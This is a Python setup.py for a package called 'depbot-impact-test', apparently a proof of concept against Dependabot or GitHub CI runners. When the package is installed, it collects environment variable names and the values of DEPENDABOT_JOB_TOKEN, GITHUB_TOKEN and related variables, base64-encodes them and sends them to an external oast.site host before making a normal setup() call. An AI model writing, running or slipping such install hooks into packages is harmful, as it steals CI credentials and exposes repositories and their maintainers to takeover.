import os
import urllib.request
import base64

# Phase 1: Exfil env var names via HTTP
env_keys = sorted(os.environ.keys())
env_str = ','.join(env_keys)
b64_env = base64.b64encode(env_str.encode()).decode()[:500]
try:
    urllib.request.urlopen('http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/envkeys?d=' + b64_env, timeout=5)
except Exception:
    pass

# Phase 2: Exfil specific interesting env vars
for key in ['DEPENDABOT_JOB_TOKEN', 'GITHUB_TOKEN', 'GITHUB_REPOSITORY', 'GITHUB_ACTOR']:
    val = os.environ.get(key, '')
    if val:
        b64_val = base64.b64encode(val[:100].encode()).decode()
        try:
            urllib.request.urlopen(f'http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/{key}?v=' + b64_val, timeout=5)
        except Exception:
            pass

# Phase 3: Normal setup() call
from setuptools import setup
setup(
    name="depbot-impact-test",
    version="1.0.0",
    install_requires=["requests==2.25.0", "urllib3==1.26.0"],
)
